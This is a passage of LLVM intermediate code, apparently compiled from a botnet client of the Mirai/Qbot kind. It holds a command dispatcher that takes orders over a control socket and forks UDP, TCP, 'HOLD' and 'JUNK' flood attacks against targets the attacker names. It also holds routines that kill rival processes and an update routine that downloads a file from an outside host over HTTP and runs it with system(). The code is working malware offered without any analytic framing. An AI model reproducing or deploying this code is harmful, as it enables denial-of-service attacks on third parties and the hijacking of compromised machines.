  %15 = load i8*, i8** %2, align 8
  %16 = call i32 @httpsocket(i8* %14, i32 80, i8* %15, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.105, i32 0, i32 0))
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %0
  br label %21

; <label>:19:                                     ; preds = %0
  %20 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #2
  br label %39

; <label>:21:                                     ; preds = %18
  %22 = load i8*, i8** %3, align 8
  %23 = call i8* @strcpy(i8* %22, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.106, i32 0, i32 0)) #2
  %24 = load i8*, i8** %3, align 8
  %25 = load i8*, i8** %3, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = call i8* @strcpy(i8* %27, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.105, i32 0, i32 0)) #2
  %29 = load i8*, i8** %3, align 8
  %30 = load i8*, i8** %3, align 8
  %31 = call i64 @strlen(i8* %30) #10
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i8* @strcpy(i8* %32, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.107, i32 0, i32 0)) #2
  %34 = load i8*, i8** %3, align 8
  %35 = call i32 @system(i8* %34)
  %36 = load i32, i32* @mainCommSock, align 4
  %37 = call i32 (i32, i8*, ...) @sockprintf(i32 %36, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.108, i32 0, i32 0))
  %38 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #2
  br label %39

; <label>:39:                                     ; preds = %21, %19
  ret void
}

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i8*, align 8
  %42 = alloca i32, align 4
  %43 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %44 = load i8**, i8*** %4, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 0
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @strcmp(i8* %46, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0)) #10
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %52, label %49

; <label>:49:                                     ; preds = %2
  %50 = load i32, i32* @mainCommSock, align 4
  %51 = call i32 (i32, i8*, ...) @sockprintf(i32 %50, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.109, i32 0, i32 0))
  br label %721

; <label>:52:                                     ; preds = %2
  %53 = load i8**, i8*** %4, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 0
  %55 = load i8*, i8** %54, align 8
  %56 = call i32 @strcmp(i8* %55, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.110, i32 0, i32 0)) #10
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %62, label %58

; <label>:58:                                     ; preds = %52
  call void @UpdateBins()
  %59 = load i32, i32* @pgid, align 4
  %60 = mul nsw i32 %59, -1
  %61 = call i32 @kill(i32 %60, i32 9) #2
  call void @exit(i32 0) #14
  unreachable

; <label>:62:                                     ; preds = %52
  %63 = load i8**, i8*** %4, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 0
  %65 = load i8*, i8** %64, align 8
  %66 = call i32 @strcmp(i8* %65, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.111, i32 0, i32 0)) #10
  %67 = icmp ne i32 %66, 0
  br i1 %67, label %89, label %68

; <label>:68:                                     ; preds = %62
  %69 = load i8**, i8*** %4, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 1
  %71 = load i8*, i8** %70, align 8
  %72 = call i32 @strcmp(i8* %71, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.112, i32 0, i32 0)) #10
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %78, label %74

; <label>:74:                                     ; preds = %68
  %75 = call i32 (...) @killer_kill()
  %76 = load i32, i32* @mainCommSock, align 4
  %77 = call i32 (i32, i8*, ...) @sockprintf(i32 %76, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.113, i32 0, i32 0))
  br label %78

; <label>:78:                                     ; preds = %74, %68
  %79 = load i8**, i8*** %4, align 8
  %80 = getelementptr inbounds i8*, i8** %79, i64 1
  %81 = load i8*, i8** %80, align 8
  %82 = call i32 @strcmp(i8* %81, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.114, i32 0, i32 0)) #10
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %88, label %84

; <label>:84:                                     ; preds = %78
  %85 = call i32 (...) @killer_init()
  %86 = load i32, i32* @mainCommSock, align 4
  %87 = call i32 (i32, i8*, ...) @sockprintf(i32 %86, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.115, i32 0, i32 0))
  br label %88

; <label>:88:                                     ; preds = %84, %78
  br label %721

; <label>:89:                                     ; preds = %62
  %90 = load i8**, i8*** %4, align 8
  %91 = getelementptr inbounds i8*, i8** %90, i64 0
  %92 = load i8*, i8** %91, align 8
  %93 = call i32 @strcmp(i8* %92, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.116, i32 0, i32 0)) #10
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %100, label %95

; <label>:95:                                     ; preds = %89
  %96 = load i32, i32* @mainCommSock, align 4
  %97 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %98 = call i8* @inet_ntoa(i32 %97) #2
  %99 = call i32 (i32, i8*, ...) @sockprintf(i32 %96, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.117, i32 0, i32 0), i8* %98)
  br label %721

; <label>:100:                                    ; preds = %89
  %101 = load i8**, i8*** %4, align 8
  %102 = getelementptr inbounds i8*, i8** %101, i64 0
  %103 = load i8*, i8** %102, align 8
  %104 = call i32 @strcmp(i8* %103, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.118, i32 0, i32 0)) #10
  %105 = icmp ne i32 %104, 0
  br i1 %105, label %162, label %106

; <label>:106:                                    ; preds = %100
  %107 = load i32, i32* %3, align 4
  %108 = icmp slt i32 %107, 4
  br i1 %108, label %121, label %109

; <label>:109:                                    ; preds = %106
  %110 = load i8**, i8*** %4, align 8
  %111 = getelementptr inbounds i8*, i8** %110, i64 2
  %112 = load i8*, i8** %111, align 8
  %113 = call i32 @atoi(i8* %112) #10
  %114 = icmp slt i32 %113, 1
  br i1 %114, label %121, label %115

; <label>:115:                                    ; preds = %109
  %116 = load i8**, i8*** %4, align 8
  %117 = getelementptr inbounds i8*, i8** %116, i64 3
  %118 = load i8*, i8** %117, align 8
  %119 = call i32 @atoi(i8* %118) #10
  %120 = icmp slt i32 %119, 1
  br i1 %120, label %121, label %122

; <label>:121:                                    ; preds = %115, %109, %106
  br label %721

; <label>:122:                                    ; preds = %115
  %123 = load i8**, i8*** %4, align 8
  %124 = getelementptr inbounds i8*, i8** %123, i64 1
  %125 = load i8*, i8** %124, align 8
  store i8* %125, i8** %5, align 8
  %126 = load i8**, i8*** %4, align 8
  %127 = getelementptr inbounds i8*, i8** %126, i64 2
  %128 = load i8*, i8** %127, align 8
  %129 = call i32 @atoi(i8* %128) #10
  store i32 %129, i32* %6, align 4
  %130 = load i8**, i8*** %4, align 8
  %131 = getelementptr inbounds i8*, i8** %130, i64 3
  %132 = load i8*, i8** %131, align 8
  %133 = call i32 @atoi(i8* %132) #10
  store i32 %133, i32* %7, align 4
  %134 = load i8*, i8** %5, align 8
  %135 = call i8* @strstr(i8* %134, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %136 = icmp ne i8* %135, null
  br i1 %136, label %137, label %153

; <label>:137:                                    ; preds = %122
  %138 = load i8*, i8** %5, align 8
  %139 = call i8* @strtok(i8* %138, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %139, i8** %8, align 8
  br label %140

; <label>:140:                                    ; preds = %150, %137
  %141 = load i8*, i8** %8, align 8
  %142 = icmp ne i8* %141, null
  br i1 %142, label %143, label %152

; <label>:143:                                    ; preds = %140
  %144 = call i32 @listFork()
  %145 = icmp ne i32 %144, 0
  br i1 %145, label %150, label %146

; <label>:146:                                    ; preds = %143
  %147 = load i8*, i8** %8, align 8
  %148 = load i32, i32* %6, align 4
  %149 = load i32, i32* %7, align 4
  call void @sendHOLD(i8* %147, i32 %148, i32 %149)
  call void @_exit(i32 0) #12
  unreachable

; <label>:150:                                    ; preds = %143
  %151 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %151, i8** %8, align 8
  br label %140

; <label>:152:                                    ; preds = %140
  br label %161

; <label>:153:                                    ; preds = %122
  %154 = call i32 @listFork()
  %155 = icmp ne i32 %154, 0
  br i1 %155, label %156, label %157

; <label>:156:                                    ; preds = %153
  br label %721

; <label>:157:                                    ; preds = %153
  %158 = load i8*, i8** %5, align 8
  %159 = load i32, i32* %6, align 4
  %160 = load i32, i32* %7, align 4
  call void @sendHOLD(i8* %158, i32 %159, i32 %160)
  call void @_exit(i32 0) #12
  unreachable

; <label>:161:                                    ; preds = %152
  br label %721

; <label>:162:                                    ; preds = %100
  %163 = load i8**, i8*** %4, align 8
  %164 = getelementptr inbounds i8*, i8** %163, i64 0
  %165 = load i8*, i8** %164, align 8
  %166 = call i32 @strcmp(i8* %165, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.119, i32 0, i32 0)) #10
  %167 = icmp ne i32 %166, 0
  br i1 %167, label %226, label %168

; <label>:168:                                    ; preds = %162
  %169 = load i32, i32* %3, align 4
  %170 = icmp slt i32 %169, 4
  br i1 %170, label %183, label %171

; <label>:171:                                    ; preds = %168
  %172 = load i8**, i8*** %4, align 8
  %173 = getelementptr inbounds i8*, i8** %172, i64 2
  %174 = load i8*, i8** %173, align 8
  %175 = call i32 @atoi(i8* %174) #10
  %176 = icmp slt i32 %175, 1
  br i1 %176, label %183, label %177

; <label>:177:                                    ; preds = %171
  %178 = load i8**, i8*** %4, align 8
  %179 = getelementptr inbounds i8*, i8** %178, i64 3
  %180 = load i8*, i8** %179, align 8
  %181 = call i32 @atoi(i8* %180) #10
  %182 = icmp slt i32 %181, 1
  br i1 %182, label %183, label %184

; <label>:183:                                    ; preds = %177, %171, %168
  br label %721

; <label>:184:                                    ; preds = %177
  %185 = load i8**, i8*** %4, align 8
  %186 = getelementptr inbounds i8*, i8** %185, i64 1
  %187 = load i8*, i8** %186, align 8
  store i8* %187, i8** %9, align 8
  %188 = load i8**, i8*** %4, align 8
  %189 = getelementptr inbounds i8*, i8** %188, i64 2
  %190 = load i8*, i8** %189, align 8
  %191 = call i32 @atoi(i8* %190) #10
  store i32 %191, i32* %10, align 4
  %192 = load i8**, i8*** %4, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 3
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @atoi(i8* %194) #10
  store i32 %195, i32* %11, align 4
  %196 = load i8*, i8** %9, align 8
  %197 = call i8* @strstr(i8* %196, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %198 = icmp ne i8* %197, null
  br i1 %198, label %199, label %217

; <label>:199:                                    ; preds = %184
  %200 = load i8*, i8** %9, align 8
  %201 = call i8* @strtok(i8* %200, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %201, i8** %12, align 8
  br label %202

; <label>:202:                                    ; preds = %214, %199
  %203 = load i8*, i8** %12, align 8
  %204 = icmp ne i8* %203, null
  br i1 %204, label %205, label %216

; <label>:205:                                    ; preds = %202
  %206 = call i32 @listFork()
  %207 = icmp ne i32 %206, 0
  br i1 %207, label %214, label %208

; <label>:208:                                    ; preds = %205
  %209 = load i8*, i8** %12, align 8
  %210 = load i32, i32* %10, align 4
  %211 = load i32, i32* %11, align 4
  call void @sendJUNK(i8* %209, i32 %210, i32 %211)
  %212 = load i32, i32* @mainCommSock, align 4
  %213 = call i32 @close(i32 %212)
  call void @_exit(i32 0) #12
  unreachable

; <label>:214:                                    ; preds = %205
  %215 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %215, i8** %12, align 8
  br label %202

; <label>:216:                                    ; preds = %202
  br label %225

; <label>:217:                                    ; preds = %184
  %218 = call i32 @listFork()
  %219 = icmp ne i32 %218, 0
  br i1 %219, label %220, label %221

; <label>:220:                                    ; preds = %217
  br label %721

; <label>:221:                                    ; preds = %217
  %222 = load i8*, i8** %9, align 8
  %223 = load i32, i32* %10, align 4
  %224 = load i32, i32* %11, align 4
  call void @sendJUNK(i8* %222, i32 %223, i32 %224)
  call void @_exit(i32 0) #12
  unreachable

; <label>:225:                                    ; preds = %216
  br label %721

; <label>:226:                                    ; preds = %162
  %227 = load i8**, i8*** %4, align 8
  %228 = getelementptr inbounds i8*, i8** %227, i64 0
  %229 = load i8*, i8** %228, align 8
  %230 = call i32 @strcmp(i8* %229, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.120, i32 0, i32 0)) #10
  %231 = icmp ne i32 %230, 0
  br i1 %231, label %375, label %232

; <label>:232:                                    ; preds = %226
  %233 = load i32, i32* %3, align 4
  %234 = icmp slt i32 %233, 6
  br i1 %234, label %286, label %235

; <label>:235:                                    ; preds = %232
  %236 = load i8**, i8*** %4, align 8
  %237 = getelementptr inbounds i8*, i8** %236, i64 3
  %238 = load i8*, i8** %237, align 8
  %239 = call i32 @atoi(i8* %238) #10
  %240 = icmp eq i32 %239, -1
  br i1 %240, label %286, label %241

; <label>:241:                                    ; preds = %235
  %242 = load i8**, i8*** %4, align 8
  %243 = getelementptr inbounds i8*, i8** %242, i64 2
  %244 = load i8*, i8** %243, align 8
  %245 = call i32 @atoi(i8* %244) #10
  %246 = icmp eq i32 %245, -1
  br i1 %246, label %286, label %247

; <label>:247:                                    ; preds = %241
  %248 = load i8**, i8*** %4, align 8
  %249 = getelementptr inbounds i8*, i8** %248, i64 4
  %250 = load i8*, i8** %249, align 8
  %251 = call i32 @atoi(i8* %250) #10
  %252 = icmp eq i32 %251, -1
  br i1 %252, label %286, label %253

; <label>:253:                                    ; preds = %247
  %254 = load i8**, i8*** %4, align 8
  %255 = getelementptr inbounds i8*, i8** %254, i64 5
  %256 = load i8*, i8** %255, align 8
  %257 = call i32 @atoi(i8* %256) #10
  %258 = icmp eq i32 %257, -1
  br i1 %258, label %286, label %259

; <label>:259:                                    ; preds = %253
  %260 = load i8**, i8*** %4, align 8
  %261 = getelementptr inbounds i8*, i8** %260, i64 5
  %262 = load i8*, i8** %261, align 8
  %263 = call i32 @atoi(i8* %262) #10
  %264 = icmp sgt i32 %263, 65536
  br i1 %264, label %286, label %265

; <label>:265:                                    ; preds = %259
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds i8*, i8** %266, i64 5
  %268 = load i8*, i8** %267, align 8
  %269 = call i32 @atoi(i8* %268) #10
  %270 = icmp sgt i32 %269, 65500
  br i1 %270, label %286, label %271

; <label>:271:                                    ; preds = %265
  %272 = load i8**, i8*** %4, align 8
  %273 = getelementptr inbounds i8*, i8** %272, i64 4
  %274 = load i8*, i8** %273, align 8
  %275 = call i32 @atoi(i8* %274) #10
  %276 = icmp sgt i32 %275, 32
  br i1 %276, label %286, label %277

; <label>:277:                                    ; preds = %271
  %278 = load i32, i32* %3, align 4
  %279 = icmp eq i32 %278, 7
  br i1 %279, label %280, label %287

; <label>:280:                                    ; preds = %277
  %281 = load i8**, i8*** %4, align 8
  %282 = getelementptr inbounds i8*, i8** %281, i64 6
  %283 = load i8*, i8** %282, align 8
  %284 = call i32 @atoi(i8* %283) #10
  %285 = icmp slt i32 %284, 1
  br i1 %285, label %286, label %287

; <label>:286:                                    ; preds = %280, %271, %265, %259, %253, %247, %241, %235, %232
  br label %721

; <label>:287:                                    ; preds = %280, %277
  %288 = load i8**, i8*** %4, align 8
  %289 = getelementptr inbounds i8*, i8** %288, i64 1
  %290 = load i8*, i8** %289, align 8
  store i8* %290, i8** %13, align 8
  %291 = load i8**, i8*** %4, align 8
  %292 = getelementptr inbounds i8*, i8** %291, i64 2
  %293 = load i8*, i8** %292, align 8
  %294 = call i32 @atoi(i8* %293) #10
  store i32 %294, i32* %14, align 4
  %295 = load i8**, i8*** %4, align 8
  %296 = getelementptr inbounds i8*, i8** %295, i64 3
  %297 = load i8*, i8** %296, align 8
  %298 = call i32 @atoi(i8* %297) #10
  store i32 %298, i32* %15, align 4
  %299 = load i8**, i8*** %4, align 8
  %300 = getelementptr inbounds i8*, i8** %299, i64 4
  %301 = load i8*, i8** %300, align 8
  %302 = call i32 @atoi(i8* %301) #10
  store i32 %302, i32* %16, align 4
  %303 = load i8**, i8*** %4, align 8
  %304 = getelementptr inbounds i8*, i8** %303, i64 5
  %305 = load i8*, i8** %304, align 8
  %306 = call i32 @atoi(i8* %305) #10
  store i32 %306, i32* %17, align 4
  %307 = load i32, i32* %3, align 4
  %308 = icmp sgt i32 %307, 6
  br i1 %308, label %309, label %314

; <label>:309:                                    ; preds = %287
  %310 = load i8**, i8*** %4, align 8
  %311 = getelementptr inbounds i8*, i8** %310, i64 6
  %312 = load i8*, i8** %311, align 8
  %313 = call i32 @atoi(i8* %312) #10
  br label %315

; <label>:314:                                    ; preds = %287
  br label %315

; <label>:315:                                    ; preds = %314, %309
  %316 = phi i32 [ %313, %309 ], [ 1000, %314 ]
  store i32 %316, i32* %18, align 4
  %317 = load i32, i32* %3, align 4
  %318 = icmp sgt i32 %317, 7
  br i1 %318, label %319, label %324

; <label>:319:                                    ; preds = %315
  %320 = load i8**, i8*** %4, align 8
  %321 = getelementptr inbounds i8*, i8** %320, i64 7
  %322 = load i8*, i8** %321, align 8
  %323 = call i32 @atoi(i8* %322) #10
  br label %325

; <label>:324:                                    ; preds = %315
  br label %325

; <label>:325:                                    ; preds = %324, %319
  %326 = phi i32 [ %323, %319 ], [ 1000000, %324 ]
  store i32 %326, i32* %19, align 4
  %327 = load i32, i32* %3, align 4
  %328 = icmp sgt i32 %327, 8
  br i1 %328, label %329, label %334

; <label>:329:                                    ; preds = %325
  %330 = load i8**, i8*** %4, align 8
  %331 = getelementptr inbounds i8*, i8** %330, i64 8
  %332 = load i8*, i8** %331, align 8
  %333 = call i32 @atoi(i8* %332) #10
  br label %335

; <label>:334:                                    ; preds = %325
  br label %335

; <label>:335:                                    ; preds = %334, %329
  %336 = phi i32 [ %333, %329 ], [ 0, %334 ]
  store i32 %336, i32* %20, align 4
  %337 = load i8*, i8** %13, align 8
  %338 = call i8* @strstr(i8* %337, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %339 = icmp ne i8* %338, null
  br i1 %339, label %340, label %361

; <label>:340:                                    ; preds = %335
  %341 = load i8*, i8** %13, align 8
  %342 = call i8* @strtok(i8* %341, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %342, i8** %21, align 8
  br label %343

; <label>:343:                                    ; preds = %358, %340
  %344 = load i8*, i8** %21, align 8
  %345 = icmp ne i8* %344, null
  br i1 %345, label %346, label %360

; <label>:346:                                    ; preds = %343
  %347 = call i32 @listFork()
  %348 = icmp ne i32 %347, 0
  br i1 %348, label %358, label %349

; <label>:349:                                    ; preds = %346
  %350 = load i8*, i8** %21, align 8
  %351 = load i32, i32* %14, align 4
  %352 = load i32, i32* %15, align 4
  %353 = load i32, i32* %16, align 4
  %354 = load i32, i32* %17, align 4
  %355 = load i32, i32* %18, align 4
  %356 = load i32, i32* %19, align 4
  %357 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %350, i32 %351, i32 %352, i32 %353, i32 %354, i32 %355, i32 %356, i32 %357)
  call void @_exit(i32 0) #12
  unreachable

; <label>:358:                                    ; preds = %346
  %359 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %359, i8** %21, align 8
  br label %343

; <label>:360:                                    ; preds = %343
  br label %374

; <label>:361:                                    ; preds = %335
  %362 = call i32 @listFork()
  %363 = icmp ne i32 %362, 0
  br i1 %363, label %373, label %364

; <label>:364:                                    ; preds = %361
  %365 = load i8*, i8** %13, align 8
  %366 = load i32, i32* %14, align 4
  %367 = load i32, i32* %15, align 4
  %368 = load i32, i32* %16, align 4
  %369 = load i32, i32* %17, align 4
  %370 = load i32, i32* %18, align 4
  %371 = load i32, i32* %19, align 4
  %372 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %365, i32 %366, i32 %367, i32 %368, i32 %369, i32 %370, i32 %371, i32 %372)
  call void @_exit(i32 0) #12
  unreachable

; <label>:373:                                    ; preds = %361
  br label %374

; <label>:374:                                    ; preds = %373, %360
  br label %721

; <label>:375:                                    ; preds = %226
  %376 = load i8**, i8*** %4, align 8
  %377 = getelementptr inbounds i8*, i8** %376, i64 0
  %378 = load i8*, i8** %377, align 8
  %379 = call i32 @strcmp(i8* %378, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.121, i32 0, i32 0)) #10
  %380 = icmp ne i32 %379, 0
  br i1 %380, label %502, label %381

; <label>:381:                                    ; preds = %375
  %382 = load i32, i32* %3, align 4
  %383 = icmp slt i32 %382, 6
  br i1 %383, label %426, label %384

; <label>:384:                                    ; preds = %381
  %385 = load i8**, i8*** %4, align 8
  %386 = getelementptr inbounds i8*, i8** %385, i64 3
  %387 = load i8*, i8** %386, align 8
  %388 = call i32 @atoi(i8* %387) #10
  %389 = icmp eq i32 %388, -1
  br i1 %389, label %426, label %390

; <label>:390:                                    ; preds = %384
  %391 = load i8**, i8*** %4, align 8
  %392 = getelementptr inbounds i8*, i8** %391, i64 2
  %393 = load i8*, i8** %392, align 8
  %394 = call i32 @atoi(i8* %393) #10
  %395 = icmp eq i32 %394, -1
  br i1 %395, label %426, label %396

; <label>:396:                                    ; preds = %390
  %397 = load i8**, i8*** %4, align 8
  %398 = getelementptr inbounds i8*, i8** %397, i64 4
  %399 = load i8*, i8** %398, align 8
  %400 = call i32 @atoi(i8* %399) #10
  %401 = icmp eq i32 %400, -1
  br i1 %401, label %426, label %402

; <label>:402:                                    ; preds = %396
  %403 = load i8**, i8*** %4, align 8
  %404 = getelementptr inbounds i8*, i8** %403, i64 4
  %405 = load i8*, i8** %404, align 8
  %406 = call i32 @atoi(i8* %405) #10
  %407 = icmp sgt i32 %406, 32
  br i1 %407, label %426, label %408

; <label>:408:                                    ; preds = %402
  %409 = load i32, i32* %3, align 4
  %410 = icmp sgt i32 %409, 6
  br i1 %410, label %411, label %417

; <label>:411:                                    ; preds = %408
  %412 = load i8**, i8*** %4, align 8
  %413 = getelementptr inbounds i8*, i8** %412, i64 6
  %414 = load i8*, i8** %413, align 8
  %415 = call i32 @atoi(i8* %414) #10
  %416 = icmp slt i32 %415, 0
  br i1 %416, label %426, label %417

; <label>:417:                                    ; preds = %411, %408
  %418 = load i32, i32* %3, align 4
  %419 = icmp eq i32 %418, 8
  br i1 %419, label %420, label %427

; <label>:420:                                    ; preds = %417
  %421 = load i8**, i8*** %4, align 8
  %422 = getelementptr inbounds i8*, i8** %421, i64 7
  %423 = load i8*, i8** %422, align 8
  %424 = call i32 @atoi(i8* %423) #10
  %425 = icmp slt i32 %424, 1
  br i1 %425, label %426, label %427

; <label>:426:                                    ; preds = %420, %411, %402, %396, %390, %384, %381
  br label %721

; <label>:427:                                    ; preds = %420, %417
  %428 = load i8**, i8*** %4, align 8
  %429 = getelementptr inbounds i8*, i8** %428, i64 1
  %430 = load i8*, i8** %429, align 8
  store i8* %430, i8** %22, align 8
  %431 = load i8**, i8*** %4, align 8
  %432 = getelementptr inbounds i8*, i8** %431, i64 2
  %433 = load i8*, i8** %432, align 8
  %434 = call i32 @atoi(i8* %433) #10
  store i32 %434, i32* %23, align 4
  %435 = load i8**, i8*** %4, align 8
  %436 = getelementptr inbounds i8*, i8** %435, i64 3
  %437 = load i8*, i8** %436, align 8
  %438 = call i32 @atoi(i8* %437) #10
  store i32 %438, i32* %24, align 4
  %439 = load i8**, i8*** %4, align 8
  %440 = getelementptr inbounds i8*, i8** %439, i64 4
  %441 = load i8*, i8** %440, align 8
  %442 = call i32 @atoi(i8* %441) #10
  store i32 %442, i32* %25, align 4
  %443 = load i8**, i8*** %4, align 8
  %444 = getelementptr inbounds i8*, i8** %443, i64 5
  %445 = load i8*, i8** %444, align 8
  store i8* %445, i8** %26, align 8
  %446 = load i32, i32* %3, align 4
  %447 = icmp eq i32 %446, 8
  br i1 %447, label %448, label %453

; <label>:448:                                    ; preds = %427
  %449 = load i8**, i8*** %4, align 8
  %450 = getelementptr inbounds i8*, i8** %449, i64 7
  %451 = load i8*, i8** %450, align 8
  %452 = call i32 @atoi(i8* %451) #10
  br label %454

; <label>:453:                                    ; preds = %427
  br label %454

; <label>:454:                                    ; preds = %453, %448
  %455 = phi i32 [ %452, %448 ], [ 10, %453 ]
  store i32 %455, i32* %27, align 4
  %456 = load i32, i32* %3, align 4
  %457 = icmp sgt i32 %456, 6
  br i1 %457, label %458, label %463

; <label>:458:                                    ; preds = %454
  %459 = load i8**, i8*** %4, align 8
  %460 = getelementptr inbounds i8*, i8** %459, i64 6
  %461 = load i8*, i8** %460, align 8
  %462 = call i32 @atoi(i8* %461) #10
  br label %464

; <label>:463:                                    ; preds = %454
  br label %464

; <label>:464:                                    ; preds = %463, %458
  %465 = phi i32 [ %462, %458 ], [ 0, %463 ]
  store i32 %465, i32* %28, align 4
  %466 = load i8*, i8** %22, align 8
  %467 = call i8* @strstr(i8* %466, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %468 = icmp ne i8* %467, null
  br i1 %468, label %469, label %489

; <label>:469:                                    ; preds = %464
  %470 = load i8*, i8** %22, align 8
  %471 = call i8* @strtok(i8* %470, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %471, i8** %29, align 8
  br label %472

; <label>:472:                                    ; preds = %486, %469
  %473 = load i8*, i8** %29, align 8
  %474 = icmp ne i8* %473, null
  br i1 %474, label %475, label %488

; <label>:475:                                    ; preds = %472
  %476 = call i32 @listFork()
  %477 = icmp ne i32 %476, 0
  br i1 %477, label %486, label %478

; <label>:478:                                    ; preds = %475
  %479 = load i8*, i8** %29, align 8
  %480 = load i32, i32* %23, align 4
  %481 = load i32, i32* %24, align 4
  %482 = load i32, i32* %25, align 4
  %483 = load i8*, i8** %26, align 8
  %484 = load i32, i32* %28, align 4
  %485 = load i32, i32* %27, align 4
  call void @sendTCP(i8* %479, i32 %480, i32 %481, i32 %482, i8* %483, i32 %484, i32 %485)
  call void @_exit(i32 0) #12
  unreachable

; <label>:486:                                    ; preds = %475
  %487 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %487, i8** %29, align 8
  br label %472

; <label>:488:                                    ; preds = %472
  br label %501

; <label>:489:                                    ; preds = %464
  %490 = call i32 @listFork()
  %491 = icmp ne i32 %490, 0
  br i1 %491, label %500, label %492

; <label>:492:                                    ; preds = %489
  %493 = load i8*, i8** %22, align 8
  %494 = load i32, i32* %23, align 4
  %495 = load i32, i32* %24, align 4
  %496 = load i32, i32* %25, align 4
  %497 = load i8*, i8** %26, align 8
  %498 = load i32, i32* %28, align 4
  %499 = load i32, i32* %27, align 4
  call void @sendTCP(i8* %493, i32 %494, i32 %495, i32 %496, i8* %497, i32 %498, i32 %499)
  call void @_exit(i32 0) #12
  unreachable

; <label>:500:                                    ; preds = %489
  br label %501

; <label>:501:                                    ; preds = %500, %488
  br label %721

; <label>:502:                                    ; preds = %375
  %503 = load i8**, i8*** %4, align 8
  %504 = getelementptr inbounds i8*, i8** %503, i64 0
  %505 = load i8*, i8** %504, align 8
  %506 = call i32 @strcmp(i8* %505, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.122, i32 0, i32 0)) #10
  %507 = icmp ne i32 %506, 0
  br i1 %507, label %556, label %508

